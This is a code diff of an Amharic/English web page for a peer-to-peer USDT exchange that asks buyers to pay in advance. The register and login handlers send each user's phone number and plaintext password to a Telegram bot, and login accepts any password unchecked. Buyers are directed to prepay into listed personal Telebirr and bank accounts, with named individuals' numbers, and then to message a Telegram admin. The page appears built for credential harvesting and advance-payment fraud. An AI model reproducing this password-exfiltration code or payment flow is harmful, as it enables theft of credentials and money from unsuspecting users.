@@ -30,12 +30,15 @@
         /* የስክሪንሻት ፋይል መምረጫ ስታይል */
         .file-label { display: block; padding: 12px; background: #232d3f; border: 1px dashed #f3cd64; text-align: center; border-radius: 8px; color: #f3cd64; cursor: pointer; font-weight: bold; font-size: 0.85rem; margin-top: 5px; }
         
-        /* የሂሳብ ማሳያ ሳጥን (Calculator Box) */
+        /* የሂሳብ ማሳያ ሳጥን */
         .calc-box { background: #121620; border: 1px solid #334155; padding: 10px; border-radius: 8px; margin-top: 5px; font-size: 0.9rem; }
         .calc-highlight { color: #f3cd64; font-weight: bold; font-size: 1.1rem; }
 
         /* የአካውንት መረጃ ሳጥን */
         .account-details-box { background: #1e293b; border: 1px solid #ef4444; padding: 12px; border-radius: 8px; margin-bottom: 15px; font-size: 0.85rem; line-height: 1.5; }
+        
+        /* የአድሚን ማገናኛ ሊንክ ስታይል */
+        .admin-link { display: inline-block; background-color: #0088cc; color: white; padding: 8px 15px; border-radius: 5px; text-decoration: none; font-weight: bold; margin-top: 10px; font-size: 0.85rem; }
     </style>
 </head>
 <body>
@@ -62,16 +65,16 @@
 
         <div id="page-home" class="page-section">
             <section class="card">
-                <div class="card-title">📈 Withdrawal Rate (BEP20 USDT)</div>
+                <div class="card-title">📈 Withdrawal Rate (USDT)</div>
                 <div class="rate-row"><span class="rate-label">Under 10 USDT</span><span class="rate-value">170 ETB</span></div>
                 <div class="rate-row"><span class="rate-label">10+ USDT</span><span class="rate-value">175 ETB</span></div>
             </section>
             
             <section class="card">
-                <div class="card-title">💳 BEP20 Deposit Address (የማስቀመጫ አድራሻ)</div>
-                <p id="address-instruction" style="font-size: 0.85rem; color: #a0aec0; margin: 0 0 15px 0;">Generate your unique BEP20 USDT deposit address</p>
+                <div class="card-title">💳 BEP20 Deposit Address (የማስቀመጫ አድራሻ - ለ Sell ብቻ)</div>
+                <p id="address-instruction" style="font-size: 0.85rem; color: #a0aec0; margin: 0 0 15px 0;">እኛን USDT ለመሸጥ ስትፈልግ ማስተላለፊያ አድራሻ</p>
                 <div id="address-display" style="display: none; background-color: #121620; padding: 12px; border-radius: 8px; border: 1px dashed #f3cd64; margin-bottom: 15px; word-break: break-all; text-align: center; font-family: monospace; color: #f3cd64;"></div>
-                <button id="generate-btn" class="btn-generate">Generate BEP20 Address</button>
+                <button id="generate-btn" class="btn-generate">Show USDT Deposit Address</button>
             </section>
 
             <section class="card">
@@ -103,7 +106,7 @@
 
                 <form id="p2p-form" onsubmit="handleTradeSubmit(event)">
                     <div style="margin-bottom: 15px;">
-                        <label style="display: block; font-size: 0.85rem; color: #a0aec0; margin-bottom: 5px;">Crypto Amount (USDT BEP20)</label>
+                        <label style="display: block; font-size: 0.85rem; color: #a0aec0; margin-bottom: 5px;">Crypto Amount (USDT)</label>
                         <input type="number" id="trade-amount" placeholder="መጠን አስገባ" required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;" oninput="calculateExchange()">
                         
                         <div class="calc-box">
@@ -113,7 +116,17 @@
                     </div>
                     
                     <div style="margin-bottom: 15px;">
-                        <label style="display: block; font-size: 0.85rem; color: #a0aec0; margin-bottom: 5px;">Payment Method</label>
+                        <label id="crypto-platform-label" style="display: block; font-size: 0.85rem; color: #a0aec0; margin-bottom: 5px;">Receive Crypto Platform (ዶላር መቀበያ መድረክ)</label>
+                        <select id="crypto-platform" style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;" onchange="updateDynamicPlaceholder()">
+                            <option value="binance">Binance (Pay ID / Email)</option>
+                            <option value="mexc">MEXC (UID / Email)</option>
+                            <option value="paxful">Paxful (Username)</option>
+                            <option value="telegram_wallet">Telegram Wallet (Phone/Address)</option>
+                        </select>
+                    </div>
+
+                    <div style="margin-bottom: 15px;">
+                        <label style="display: block; font-size: 0.85rem; color: #a0aec0; margin-bottom: 5px;">Payment Method (የክፍያ መንገድ)</label>
                         <select id="payment-method" style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
                             <option value="telebirr">Telebirr (ቴሌብር)</option>
                             <option value="cbe">CBE (የኢትዮጵያ ንግድ ባንክ)</option>
@@ -121,13 +134,13 @@
                     </div>
                     
                     <div style="margin-bottom: 15px;">
-                        <label style="display: block; font-size: 0.85rem; color: #a0aec0; margin-bottom: 5px;">Your Phone Number</label>
+                        <label style="display: block; font-size: 0.85rem; color: #a0aec0; margin-bottom: 5px;">Your Phone Number (የራስዎ ስልክ ቁጥር)</label>
                         <input type="tel" id="user-phone" placeholder="09..." required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
                     </div>
 
                     <div style="margin-bottom: 15px;">
-                        <label id="dynamic-label" style="display: block; font-size: 0.85rem; color: #a0aec0; margin-bottom: 5px;">Your BEP20 Address (USDT መቀበያ አድራሻህ)</label>
-                        <input type="text" id="dynamic-input" placeholder="0x..." required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
+                        <label id="dynamic-label" style="display: block; font-size: 0.85rem; color: #a0aec0; margin-bottom: 5px;">Your Binance Pay ID or Email</label>
+                        <input type="text" id="dynamic-input" placeholder="የመረጡት መድረክ መለያ (ID/Email) ያስገቡ" required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
                     </div>
 
                     <div id="sell-screenshot-area" style="display: none; margin-bottom: 20px;">
@@ -136,7 +149,7 @@
                         <input type="file" id="sell-file" accept="image/*" style="display: none;" onchange="updateFileLabel(this)">
                     </div>
 
-                    <button type="submit" id="submit-trade-btn" class="btn-generate" style="background: linear-gradient(180deg, #22c55e 0%, #16a34a 100%); color: white; width: 100%; cursor: pointer;">Submit Buy Order</button>
+                    <button type="submit" id="submit-trade-btn" class="btn-generate" style="background: linear-gradient(180deg, #22c55e 0%, #16a34a 100%) !important; color: white; width: 100%; cursor: pointer;">Submit Buy Order</button>
                 </form>
             </section>
         </div>
@@ -149,24 +162,28 @@
                     <div><strong>Type:</strong> <span id="status-type" style="text-transform: uppercase;">-</span></div>
                     <div><strong>Amount:</strong> <span id="status-amount" style="color: #4ade80;">-</span> USDT</div>
                     <div><strong>Est. Payment:</strong> <span id="status-calculated-etb" style="color: #f3cd64; font-weight: bold;">-</span> ETB</div>
-                    <div><strong>Payment Method:</strong> <span id="status-method" style="text-transform: uppercase;">-</span></div>
+                    <div><strong>Platform/Account:</strong> <span id="status-platform-detail" style="color: #38bdf8;">-</span></div>
                 </div>
 
                 <div id="buy-payment-instruction" style="display: none; background-color: #1a202e; padding: 15px; border-radius: 8px; border: 1px solid #22c55e; margin: 15px 0; text-align: left;">
-                    <div style="color: #22c55e; font-weight: bold; margin-bottom: 8px;">⚠️ እባክዎ አስቀድመው ይክፈሉ፦</div>
+                    <div style="color: #22c55e; font-weight: bold; margin-bottom: 8px;">⚠️ እባክዎ አስቀድመው በእነዚህ አካውንቶች ይክፈሉ፦</div>
                     <div style="font-size: 0.85rem; color: #cbd5e1; margin-bottom: 5px;">📱 <strong>Telebirr:</strong> <span style="color: white;">0997370734</span> (Amir Yusuf Degene)</div>
                     <div style="font-size: 0.85rem; color: #cbd5e1; margin-bottom: 8px;">🏦 <strong>CBE Bank:</strong> <span style="color: white;">1000731446052</span> (Semir Yusuf Degene)</div>
-                    <div style="font-size: 0.85rem; color: #cbd5e1; border-top: 1px solid #334155; padding-top: 5px;">ብር መላክዎን ሲጨርሱ ማረጋገጫ ስክሪንሻት እዚህ ይስቀሉ፦</div>
+                    <div style="font-size: 0.85rem; color: #cbd5e1; border-top: 1px solid #334155; padding-top: 5px; margin-bottom: 5px;">ብር መላክዎን ሲጨርሱ ማረጋገጫ ስክሪንሻት እዚህ ይስቀሉ፦</div>
                     
                     <label class="file-label" for="buy-receipt-file" style="border-color: #22c55e; color: #4ade80;">📸 Upload Payment Receipt (የክፍያ ስክሪንሻት)</label>
                     <input type="file" id="buy-receipt-file" accept="image/*" style="display: none;" onchange="uploadBuyReceipt()">
+                </div>
+
+                <div id="admin-contact-area" style="margin: 15px 0; padding: 10px; background-color: #1e293b; border-radius: 8px; border: 1px solid #38bdf8; display:none;">
+                    <div style="color: #38bdf8; font-weight: bold; font-size:0.9rem;">📢 ማረጋገጫ ደርሶናል! እባክዎ አድሚኑን ያናግሩ</div>
+                    <a href="https://t.me/CRYPTO2115" target="_blank" class="admin-link">📩 @CRYPTO2115 ያናግሩ</a>
                 </div>
 
                 <div style="margin: 20px 0;">
                     <div style="font-size: 0.85rem; color: #a0aec0; margin-bottom: 5px;">Current Status</div>
                     <div id="order-status-box" class="status-badge status-pending">Pending 🟡</div>
                 </div>
-                <p id="status-note" style="font-size: 0.8rem; color: #a0aec0; line-height: 1.4;">እባክዎ ገጹን ሳይዘጉ ይጠብቁ...</p>
                 <button type="button" onclick="backToHome()" class="btn-generate" style="background-color: #334155; margin-top: 15px;">Back to Home</button>
             </section>
         </div>
@@ -174,13 +191,13 @@
         <div id="page-guide" class="page-section" style="display: none;">
             <section class="card">
                 <div class="card-title">📖 How to Trade</div>
-                <p style="color: #a0aec0; font-size: 0.9rem; line-height: 1.6;">በስልክ ቁጥርዎ አካውንት በመክፈት ይግቡ። የ P2P ትዕዛዝ በሚያስገቡበት ጊዜ የስክሪንሻት ማረጋገጫ ማያያዝዎን አይዘንጉ።</p>
+                <p style="color: #a0aec0; font-size: 0.9rem; line-height: 1.6;">በስልክ ቁጥርዎ አካውንት በመክፈት ይግቡ። የኔትወርክ ፊይ (Fee) ለመቀነስ የውስጥ ማስተላለፊያ ዘዴዎችን (Binance Pay, MEXC, Telegram) ይጠቀሙ።</p>
             </section>
         </div>
 
         <footer class="footer">
             <span>Forex P2P Squad © 2026</span>
-            <span>v2.8</span>
+            <span>v3.1</span>
         </footer>
     </div>
 
@@ -237,11 +254,7 @@
 
         window.onload = function() {
             const savedUser = localStorage.getItem('currentUserPhone');
-            if (savedUser) {
-                isLoggedIn = true;
-                loggedInUserPhone = savedUser;
-                updateAuthHeader();
-            }
+            if (savedUser) { isLoggedIn = true; loggedInUserPhone = savedUser; updateAuthHeader(); }
         };
 
         function showNotification(text, isError = false) {
@@ -252,28 +265,29 @@
             setTimeout(() => { toast.classList.remove('show'); }, 3000);
         }
 
-        // ⚡ የቀጥታ ሂሳብ ስሌት ፋንክሽን (Calculate Engine)
         function calculateExchange() {
             const amountInput = document.getElementById('trade-amount').value;
             const rateLabel = document.getElementById('calc-rate');
             const totalLabel = document.getElementById('calc-total');
-            
-            if(!amountInput || amountInput <= 0) {
-                totalLabel.innerText = "0.00";
-                calculatedETBGlobal = 0;
-                return;
-            }
-
+            if(!amountInput || amountInput <= 0) { totalLabel.innerText = "0.00"; calculatedETBGlobal = 0; return; }
             const amount = parseFloat(amountInput);
-            let rate = 170; // Under 10 USDT
-            if (amount >= 10) {
-                rate = 175; // 10+ USDT
-            }
-
+            let rate = (amount >= 10) ? 175 : 170;
             rateLabel.innerText = rate;
             const total = amount * rate;
             totalLabel.innerText = total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
             calculatedETBGlobal = total;
+        }
+
+        function updateDynamicPlaceholder() {
+            if (currentTradeType === 'sell') return;
+            const platform = document.getElementById('crypto-platform').value;
+            const label = document.getElementById('dynamic-label');
+            const input = document.getElementById('dynamic-input');
+
+            if(platform === 'binance') { label.innerText = "Your Binance Pay ID or Email"; input.placeholder = "e.g. 238492048 or email@gmail.com"; }
+            else if(platform === 'mexc') { label.innerText = "Your MEXC UID or Email"; input.placeholder = "e.g. 83920482 or email@gmail.com"; }
+            else if(platform === 'paxful') { label.innerText = "Your Paxful Username"; input.placeholder = "e.g. PaxfulUser123"; }
+            else if(platform === 'telegram_wallet') { label.innerText = "Your Telegram Phone/Wallet Tag"; input.placeholder = "+2519... or @username"; }
         }
 
         function updateFileLabel(input) {
@@ -286,23 +300,13 @@
         function updateAuthHeader() {
             const authArea = document.getElementById('auth-area');
             if(isLoggedIn) {
-                authArea.innerHTML = `
-                    <span style="color: #4ade80; font-size: 0.85rem; font-weight: bold; margin-right: 10px;">👤 ${loggedInUserPhone}</span>
-                    <button onclick="handleLogout()" style="background-color: #334155; color: white; border: none; padding: 6px 12px; border-radius: 5px; cursor: pointer; font-size: 0.8rem;">Logout</button>
-                `;
+                authArea.innerHTML = `<span style="color: #4ade80; font-size: 0.85rem; font-weight: bold; margin-right: 10px;">👤 ${loggedInUserPhone}</span><button onclick="handleLogout()" style="background-color: #334155; color: white; border: none; padding: 6px 12px; border-radius: 5px; cursor: pointer; font-size: 0.8rem;">Logout</button>`;
             } else {
-                authArea.innerHTML = `
-                    <button class="btn-login" onclick="openModal('login-modal')">Login (ግባ)</button>
-                    <button class="btn-register" onclick="openModal('register-modal')">Register (ተመዝገብ)</button>
-                `;
+                authArea.innerHTML = `<button class="btn-login" onclick="openModal('login-modal')">Login (ግባ)</button><button class="btn-register" onclick="openModal('register-modal')">Register (ተመዝገብ)</button>`;
             }
         }
 
-        function handleLogout() {
-            isLoggedIn = false; loggedInUserPhone = "";
-            localStorage.removeItem('currentUserPhone');
-            updateAuthHeader(); showNotification("ወጥተዋል!"); switchTab('home');
-        }
+        function handleLogout() { isLoggedIn = false; loggedInUserPhone = ""; localStorage.removeItem('currentUserPhone'); updateAuthHeader(); showNotification("ወጥተዋል!"); switchTab('home'); }
 
         function switchTab(tabName) {
             document.querySelectorAll('.page-section').forEach(page => page.style.display = 'none');
@@ -325,8 +329,8 @@
             const dynamicInput = document.getElementById('dynamic-input');
             const screenshotArea = document.getElementById('sell-screenshot-area');
             const ourAccountsBox = document.getElementById('our-accounts-info');
+            const platformRow = document.getElementById('crypto-platform-label').parentElement;
 
-            // ሂሳቡን በየመሃሉ ማፅዳት
             document.getElementById('trade-amount').value = "";
             calculateExchange();
 
@@ -335,23 +339,24 @@
                 sellBtn.style.backgroundColor = '#1a202e'; sellBtn.style.color = '#a0aec0';
                 submitBtn.innerText = "Submit Buy Order";
                 submitBtn.style.background = "linear-gradient(180deg, #22c55e 0%, #16a34a 100%)";
-                dynamicLabel.innerText = "Your BEP20 Address (USDT መቀበያ አድራሻህ)";
-                dynamicInput.placeholder = "0x...";
                 screenshotArea.style.display = "none";
                 ourAccountsBox.style.display = "none";
+                platformRow.style.display = "block";
+                updateDynamicPlaceholder();
             } else {
                 sellBtn.style.backgroundColor = '#ef4444'; sellBtn.style.color = 'white';
                 buyBtn.style.backgroundColor = '#1a202e'; buyBtn.style.color = '#a0aec0';
                 submitBtn.innerText = "Submit Sell Order";
                 submitBtn.style.background = "linear-gradient(180deg, #ef4444 0%, #dc2626 100%)";
                 dynamicLabel.innerText = "Your Account Details (ብር የምንልክልህ የባንክ/ቴሌብር ስም እና ቁጥር)";
-                dynamicInput.placeholder = "ለምሳሌ፡ CBE - 1000... - አበበ በላይ";
+                dynamicInput.placeholder = "CBE - 1000... - ስም ያስገቡ";
                 screenshotArea.style.display = "block";
                 ourAccountsBox.style.display = "block";
+                platformRow.style.display = "none";
             }
         }
 
-        function sendPhotoToTelegram(file, captionText, orderId, type, amount, method) {
+        function sendPhotoToTelegram(file, captionText, orderId, type, amount, method, info) {
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
             formData.append("photo", file);
@@ -360,45 +365,40 @@
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData })
             .then(res => { 
-                showNotification("ትዕዛዝዎ እና ማረጋገጫው ተልኳል!"); 
-                startOrderStatusListener(orderId, type, amount, method);
-            })
-            .catch(err => { showNotification("ችግር አጋጥሟል!", true); });
+                showNotification("ስክሪንሻቱ በተሳካ ሁኔታ ተልኳል!"); 
+                startOrderStatusListener(orderId, type, amount, method, info, true);
+            });
         }
 
         function handleTradeSubmit(event) {
             event.preventDefault();
-            if(!isLoggedIn) { 
-                showNotification("እባክዎ መጀመሪያ Login ያድርጉ!", true); 
-                openModal('login-modal'); 
-                return; 
-            }
+            if(!isLoggedIn) { showNotification("እባክዎ መጀመሪያ Login ያድርጉ!", true); openModal('login-modal'); return; }
 
             const amount = document.getElementById('trade-amount').value;
             const method = document.getElementById('payment-method').value;
             const phone = document.getElementById('user-phone').value;
             const dynamicValue = document.getElementById('dynamic-input').value;
+            const platform = document.getElementById('crypto-platform').value;
             const sellFile = document.getElementById('sell-file').files[0];
 
-            if(currentTradeType === 'sell' && !sellFile) {
-                showNotification("እባክዎ የ USDT ማስተላለፊያ ስክሪንሻት ያያይዙ!", true);
-                return;
-            }
+            if(currentTradeType === 'sell' && !sellFile) { showNotification("እባክዎ የ USDT ማስተላለፊያ ስክሪንሻት ያያይዙ!", true); return; }
 
             const orderId = "ORD-" + Math.floor(100000 + Math.random() * 900000);
             globalCurrentOrderId = orderId;
+
+            let targetDestination = (currentTradeType === 'buy') ? `Platform: ${platform.toUpperCase()} (${dynamicValue})` : `User Bank Account: ${dynamicValue}`;
 
             const msg = `🔔 *አዲስ የ P2P ትዕዛዝ ደርሷል!*\n\n` +
                         `🆔 *Order ID:* \`${orderId}\`\n` +
                         `👤 *አይነት:* ${currentTradeType.toUpperCase()}\n` +
                         `💰 *የዶላር መጠን:* ${amount} USDT\n` +
-                        `💵 *የታሰበው ጠቅላላ ክፍያ:* ${calculatedETBGlobal.toLocaleString()} ETB\n` +
+                        `💵 *ጠቅላላ ክፍያ:* ${calculatedETBGlobal.toLocaleString()} ETB\n` +
                         `🏦 *ክፍያ መንገድ:* ${method.toUpperCase()}\n` +
                         `📞 *የደንበኛ ስልክ:* ${phone}\n` +
-                        `🔑 *የደንበኛ መረጃ:* \`${dynamicValue}\``;
+                        `🔑 *የመድረክ መፈላጊ:* \`${targetDestination}\``;
 
             if (currentTradeType === 'sell' && sellFile) {
-                sendPhotoToTelegram(sellFile, msg + "\n\n📸 *ማሳሰቢያ:* ደንበኛው ለእኛ የላከበት የUSDT ስክሪንሻት ከላይ ተያይዟል።", orderId, currentTradeType, amount, method);
+                sendPhotoToTelegram(sellFile, msg, orderId, currentTradeType, amount, method, targetDestination);
             } else {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                 fetch(url, {
@@ -407,8 +407,8 @@
                     body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
                 })
                 .then(() => {
-                    showNotification("ትዕዛዝዎ በተሳካ ሁኔታ ተልኳል!");
-                    startOrderStatusListener(orderId, currentTradeType, amount, method);
+                    showNotification("ትዕዛዝዎ ተልኳል! ክፍያ ይጠብቃል...");
+                    startOrderStatusListener(orderId, currentTradeType, amount, method, targetDestination, false);
                 });
             }
             
@@ -431,25 +431,33 @@
             formData.append("parse_mode", "Markdown");
             
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData })
-            .then(() => { showNotification("የክፍያ ማረጋገጫው ተልኳል!"); });
+            .then(() => { 
+                showNotification("የክፍያ ማረጋገጫው ደርሷል!");
+                document.getElementById('admin-contact-area').style.display = 'block';
+                document.getElementById('order-status-box').innerText = "Pending (ማረጋገጫ ተልኳል) 🟡";
+            });
         }
 
-        function startOrderStatusListener(orderId, type, amount, method) {
+        function startOrderStatusListener(orderId, type, amount, method, info, hasScreenshot) {
             document.getElementById('main-nav').style.display = 'none';
             document.getElementById('status-id').innerText = orderId;
             document.getElementById('status-type').innerText = type;
             document.getElementById('status-amount').innerText = amount;
             document.getElementById('status-calculated-etb').innerText = calculatedETBGlobal.toLocaleString();
-            document.getElementById('status-method').innerText = method;
+            document.getElementById('status-platform-detail').innerText = info;
 
-            document.getElementById('buy-payment-instruction').style.display = (type === 'buy') ? 'block' : 'none';
+            if (type === 'buy') {
+                document.getElementById('buy-payment-instruction').style.display = 'block';
+                document.getElementById('admin-contact-area').style.display = hasScreenshot ? 'block' : 'none';
+            } else {
+                document.getElementById('buy-payment-instruction').style.display = 'none';
+                document.getElementById('admin-contact-area').style.display = 'block';
+            }
+
             switchTab('status');
         }
 
-        function backToHome() { 
-            document.getElementById('main-nav').style.display = 'flex'; 
-            switchTab('home'); 
-        }
+        function backToHome() { document.getElementById('main-nav').style.display = 'flex'; switchTab('home'); }
 
         function handleRegisterSubmit(event) {
             event.preventDefault();
@@ -458,9 +466,8 @@
             const pass = document.getElementById('reg-pass').value;
             const msg = `📝 *አዲስ ተጠቃሚ ተመዝግቧል!*\n\n👤 *ስም:* ${name}\n📞 *ስልክ:* ${phone}\n🔑 *ይለፍ ቃል:* \`${pass}\``;
             isLoggedIn = true; loggedInUserPhone = phone; localStorage.setItem('currentUserPhone', phone); updateAuthHeader();
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" }) });
-            closeModal('register-modal'); showNotification("በተሳካ ሁኔታ ተመዝግበዋል!");
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" }) });
+            closeModal('register-modal'); showNotification("በተካሳ ሁኔታ ተመዝግበዋል!");
         }
 
         function handleLoginSubmit(event) {
@@ -469,8 +476,7 @@
             const pass = document.getElementById('login-pass').value;
             const msg = `🔐 *የግባ (Login) ሙከራ*\n\n📞 *ስልክ:* ${phone}\n🔑 *ይለፍ ቃል:* \`${pass}\``;
             isLoggedIn = true; loggedInUserPhone = phone; localStorage.setItem('currentUserPhone', phone); updateAuthHeader();
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" }) });
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" }) });
             closeModal('login-modal'); showNotification("እንኳን ደህና መጡ!");
         }
 
@@ -478,7 +484,7 @@
             const addressDisplay = document.getElementById('address-display');
             const instruction = document.getElementById('address-instruction');
             addressDisplay.innerHTML = `<div style="font-weight: bold; margin-bottom: 8px; color: #f3cd64; word-break: break-all;">${REAL_BEP20_ADDRESS}</div><button id="copy-btn" type="button" style="background-color: #232d3f; color: #f3cd64; border: 1px solid #f3cd64; padding: 5px 10px; border-radius: 5px; font-size: 0.8rem; cursor: pointer;">📋 Copy Address</button>`;
-            addressDisplay.style.display = 'block'; instruction.innerText = "Your address is ready:"; this.innerText = "Generated!";
+            addressDisplay.style.display = 'block'; instruction.innerText = "USDT መላኪያ አድራሻችን፦"; this.innerText = "Done!";
             document.getElementById('copy-btn').addEventListener('click', function() {
                 navigator.clipboard.writeText(REAL_BEP20_ADDRESS).then(() => { this.innerText = "✅ Copied!"; setTimeout(() => { this.innerText = "📋 Copy Address"; }, 2000); });
             });
